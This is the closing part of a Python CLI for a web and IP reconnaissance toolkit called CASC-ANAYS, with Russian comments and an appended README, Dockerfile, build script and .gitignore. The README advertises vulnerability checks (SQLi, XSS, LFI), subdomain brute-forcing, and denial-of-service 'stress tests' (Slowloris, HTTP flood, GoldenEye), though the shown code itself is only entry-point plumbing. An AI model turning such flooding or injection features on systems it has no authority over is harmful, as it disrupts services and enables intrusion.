            results = app.run(args)

            # Вывод результатов
            if results and not args.quiet:
                print_results(app)

            # Открыть отчёт
            if args.open and not args.no_report:
                out_dir = app.config.get_output_dir()
                htmls = sorted(out_dir.glob("casc_anays_*.html"), key=os.path.getmtime)
                if htmls:
                    if open_in_browser(str(htmls[-1])):
                        print(Colors.green(f"  ✓ Отчёт открыт в браузере"))
                    else:
                        print(Colors.yellow(f"  Не удалось открыть браузер"))

            return 0

        # ---------- Нет команды — справка ----------
        print_help_extended()
        return 0

    except KeyboardInterrupt:
        print(Colors.yellow("\n\n  ⚠ Операция прервана пользователем"))
        return 130
    except Exception as e:
        print(Colors.red(f"\n  ✗ Ошибка: {e}"))
        if args.debug:
            traceback.print_exc()
        return 1


# ==============================================================================
# ТОЧКА ВХОДА
# ==============================================================================
if __name__ == "__main__":
    # Устанавливаем обработчики сигналов
    try:
        install_signal_handlers()
    except Exception:
        pass

    # Запуск
    try:
        exit_code = main()
        sys.exit(exit_code or 0)
    except KeyboardInterrupt:
        print(Colors.yellow("\n\n  ⚠ Прервано"))
        sys.exit(130)
    except Exception as e:
        print(Colors.red(f"\n  ✗ Критическая ошибка: {e}"))
        if os.environ.get("CASC_DEBUG") or "--debug" in sys.argv:
            traceback.print_exc()
        sys.exit(1)


# ==============================================================================
# ==============================================================================
# ПРИЛОЖЕНИЕ A: README.md (сохранить как README.md в корне проекта)
# ==============================================================================
# ==============================================================================
#
# # CASC-ANAYS v4.0
#
# > Глобальный аналитический комплекс для анализа веб-сайтов и IP
#
# [![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
# [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
#
# ## Возможности
#
# - 🔌 **Сканирование портов** — TCP + UDP, ~200 популярных портов, баннеры сервисов
# - 🌐 **HTTP-анализ** — заголовки, SSL/TLS, WAF, технологии, security headers
# - 🌍 **DNS-анализ** — A/AAAA/MX/NS/TXT/CNAME/SOA/CAA/SRV, DMARC, PTR
# - 🕵 **OSINT** — WHOIS, разведка
# - 🌐 **Поддомены** — crt.sh + Sublist3r + amass + subfinder + DNS-брутфорс
# - ⚠️ **Уязвимости** — CVE (NVD API), Nikto, SQLi, XSS, LFI
# - 💥 **Стресс-тесты** — Slowloris, HTTP-флуд, GoldenEye
# - 📦 **40 GitHub-репозиториев** — авто-клонирование, обновление, зависимости
# - 📄 **4 формата отчётов** — HTML (фиолетовая тема), JSON, CSV, Markdown
# - 🖥 **Интерактивный режим** — меню на 12 пунктов
#
# ## Установка
#
# ```bash
# # 1. Клонируем
# git clone https://github.com/seismon/casc-anays.git
# cd casc-anays
#
# # 2. Устанавливаем зависимости Python
# pip install -r requirements.txt
#
# # 3. (опционально) Инициализируем репозитории инструментов
# python casc_anays.py --init-repos
#
# # 4. Запускаем
# python casc_anays.py -i
# ```
#
# ## Быстрый старт
#
# ```bash
# # Полный анализ одного домена
# python casc_anays.py -t example.com --full
#
# # Умный анализ (авто-подбор модулей)
# python casc_anays.py -t example.com --smart
#
# # Интерактивный режим
# python casc_anays.py -i
#
# # Список целей из файла
# python casc_anays.py --targets-file targets.txt --smart
#
# # Только порты и HTTP
# python casc_anays.py -t example.com -m ports,http
# ```
#
# ## Документация
#
# Полная справка: `python casc_anays.py --print-help`
#
# ## Лицензия
#
# MIT © seismon
#
# ==============================================================================
# ПРИЛОЖЕНИЕ B: requirements.txt (сохранить как requirements.txt)
# ==============================================================================
# colorama>=0.4.6
# requests>=2.31.0
# beautifulsoup4>=4.12.0
# dnspython>=2.4.0
# python-whois>=0.9.4
# aiohttp>=3.9.0
# ==============================================================================
# ПРИЛОЖЕНИЕ C: Dockerfile (сохранить как Dockerfile)
# ==============================================================================
# FROM python:3.11-slim
#
# LABEL maintainer="seismon"
# LABEL description="CASC-ANAYS v4.0 — Global Analytical Complex"
#
# WORKDIR /app
#
# # Системные зависимости
# RUN apt-get update && apt-get install -y --no-install-recommends \
#     git \
#     perl \
#     curl \
#     ca-certificates \
#     && rm -rf /var/lib/apt/lists/*
#
# # Python-зависимости
# COPY requirements.txt .
# RUN pip install --no-cache-dir -r requirements.txt
#
# # Код
# COPY . .
#
# # Создаём директории
# RUN mkdir -p reports repos
#
# # Точка входа
# ENTRYPOINT ["python", "casc_anays.py"]
# CMD ["--print-help"]
# ==============================================================================
# ПРИЛОЖЕНИЕ D: docker-compose.yml (сохранить как docker-compose.yml)
# ==============================================================================
# version: '3.8'
#
# services:
#   casc-anays:
#     build: .
#     image: casc-anays:4.0
#     container_name: casc-anays
#     volumes:
#       - ./reports:/app/reports
#       - ./repos:/app/repos
#       - ./config.json:/app/config.json
#     stdin_open: true
#     tty: true
#     command: ["-i"]
# ==============================================================================
# ПРИЛОЖЕНИЕ E: build.sh (сохранить как build.sh, chmod +x)
# ==============================================================================
# #!/bin/bash
# # Собирает все части в один монолит casc_anays.py
#
# set -e
#
# echo "→ Сборка CASC-ANAYS..."
#
# cat part1_core.py \
#     part2_repos.py \
#     part3_analysis.py \
#     part4_vuln.py \
#     part5_integration.py \
#     part6_reports.py \
#     part7_cli.py > casc_anays.py
#
# LINES=$(wc -l < casc_anays.py)
# echo "✓ Готово: casc_anays.py ($LINES строк)"
# echo ""
# echo "Запуск: python casc_anays.py -i"
# ==============================================================================
# ПРИЛОЖЕНИЕ F: .gitignore (сохранить как .gitignore)
# ==============================================================================
# __pycache__/
# *.py[cod]
# *$py.class
# *.so
# .Python
# build/
# develop-eggs/
# dist/
# downloads/
# eggs/
# .eggs/
# lib/
# lib64/
# parts/
# sdist/
# var/
# wheels/
# *.egg-info/
# .installed.cfg
# *.egg
#
# # Virtual env
# venv/
# ENV/
# env/
#
# # IDE
# .vscode/
# .idea/
# *.swp
# *.swo
#
# # Project-specific
# config.json
# reports/
# repos/
# *.log
# proxies.txt
# ==============================================================================
# КОНЕЦ PART 7 — ПРОЕКТ ЗАВЕРШЁН
# ==============================================================================
